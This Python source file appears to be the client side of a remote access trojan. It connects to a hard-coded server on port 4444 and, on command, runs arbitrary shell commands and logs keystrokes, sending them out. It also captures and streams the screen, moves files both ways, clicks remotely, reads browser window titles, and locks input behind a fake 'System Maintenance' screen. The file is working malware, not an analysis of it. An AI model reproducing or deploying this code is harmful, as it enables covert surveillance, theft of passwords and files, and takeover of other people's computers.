import socket
import subprocess
import threading
import tkinter as tk
import ctypes
from PIL import ImageGrab
import io
import os
import pyautogui
import time
import win32gui
import win32process
import psutil
from pynput import keyboard

SERVER_IP = '192.188.8.87'  # Change this to your server IP
PORT = 4444

# Known browsers for tab detection
BROWSERS = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe']

client = socket.socket()
client.connect((SERVER_IP, PORT))

executor_number = input("Enter executor number: ").strip()
client.send(executor_number.encode())
if client.recv(1024).decode() != 'OK':
    print("[-] Auth failed.")
    client.close()
    exit()

# GLOBALS
log_buffer = ""
keylogger_running = False
keylogger_thread = None

def freeze_screen():
    def block_input():
        ctypes.windll.user32.BlockInput(True)
    def overlay():
        win = tk.Tk()
        win.title("System Freeze")
        win.attributes("-fullscreen", True)
        win.configure(bg="black")
        label = tk.Label(win, text="System Maintenance in Progress", fg="white", bg="black", font=("Arial", 32))
        label.pack(expand=True)
        win.attributes("-topmost", True)
        win.mainloop()
    threading.Thread(target=block_input, daemon=True).start()
    threading.Thread(target=overlay, daemon=True).start()

def unfreeze_screen():
    ctypes.windll.user32.BlockInput(False)

def send_screenshot(sock):
    image = ImageGrab.grab()
    buffer = io.BytesIO()
    image.save(buffer, format="PNG")
    img_bytes = buffer.getvalue()
    buffer.close()
    sock.send(str(len(img_bytes)).encode())
    sock.recv(2)
    sock.send(img_bytes)

def upload_file(sock):
    filename = sock.recv(1024).decode()
    try:
        with open(filename, 'rb') as f:
            data = f.read()
        sock.send(str(len(data)).encode())
        sock.recv(2)
        sock.send(data)
    except:
        sock.send(b'0')

def download_file(sock):
    filename = sock.recv(1024).decode()
    size = int(sock.recv(1024).decode())
    sock.send(b'OK')
    data = b''
    while len(data) < size:
        chunk = sock.recv(4096)
        data += chunk
    with open(filename, 'wb') as f:
        f.write(data)

def handle_chat(sock):
    while True:
        msg = sock.recv(1024).decode()
        if msg.lower() == 'exitchat':
            break
        reply = input(f"[Admin]: {msg}\n[You]: ")
        sock.send(reply.encode())
        if reply.lower() == 'exitchat':
            break

def handle_remote_input(sock):
    x = int(sock.recv(1024).decode())
    sock.send(b'OK')
    y = int(sock.recv(1024).decode())
    sock.send(b'OK')
    click_type = sock.recv(1024).decode()
    if click_type == 'left':
        pyautogui.click(x, y)
    elif click_type == 'right':
        pyautogui.click(x, y, button='right')
    sock.send(b'CLICKED')

def live_screen_send(sock):
    try:
        while True:
            image = ImageGrab.grab()
            buffer = io.BytesIO()
            image.save(buffer, format="PNG")
            img_bytes = buffer.getvalue()
            buffer.close()
            sock.send(f"{len(img_bytes):<16}".encode())
            ack = sock.recv(2)
            if ack != b'OK':
                break
            sock.send(img_bytes)
            time.sleep(0.5)
    except Exception:
        pass

# Browser tab enumeration
def get_browser_tabs():
    tabs = []
    def enum_windows(hwnd, _):
        if win32gui.IsWindowVisible(hwnd):
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                proc = psutil.Process(pid)
                if proc.name().lower() in BROWSERS:
                    title = win32gui.GetWindowText(hwnd)
                    if title:
                        tabs.append(f"[{proc.name()}] {title}")
            except:
                pass
        return True
    win32gui.EnumWindows(enum_windows, None)
    return tabs

# Keylogger functions
def on_press(key):
    global log_buffer
    try:
        log_buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log_buffer += " "
        elif key == keyboard.Key.enter:
            log_buffer += "\n"
        else:
            log_buffer += f" [{str(key)}] "

    if len(log_buffer) > 50:
        try:
            client.send(log_buffer.encode())
        except:
            pass
        log_buffer = ""

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

def send_tabs():
    tabs = get_browser_tabs()
    for tab in tabs:
        client.send(tab.encode())
        time.sleep(0.05)
    client.send(b'[ENDTABS]')

def main():
    global keylogger_running
    global keylogger_thread
    while True:
        try:
            cmd = client.recv(1024).decode()
        except:
            break
        if not cmd:
            break

        if cmd == 'freeze':
            freeze_screen()
            client.send(b'Screen frozen')
        elif cmd == 'unfreeze':
            unfreeze_screen()
            client.send(b'Screen unfrozen')
        elif cmd == 'screenshot':
            send_screenshot(client)
        elif cmd == 'upload':
            upload_file(client)
        elif cmd == 'download':
            download_file(client)
        elif cmd == 'chat':
            handle_chat(client)
        elif cmd == 'click':
            handle_remote_input(client)
        elif cmd == 'viewscreen':
            live_screen_send(client)
        elif cmd == 'keylogger':
            if not keylogger_running:
                keylogger_thread = start_keylogger()
                keylogger_running = True
            # Send any buffered logs immediately
            global log_buffer
            if log_buffer:
                client.send(log_buffer.encode())
                log_buffer = ""
        elif cmd == 'tabs':
            send_tabs()
        elif cmd == 'exit':
            break
        else:
            # Run as shell command
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                output = str(e).encode()
            client.send(output)

    client.close()

if __name__ == "__main__":
    main()
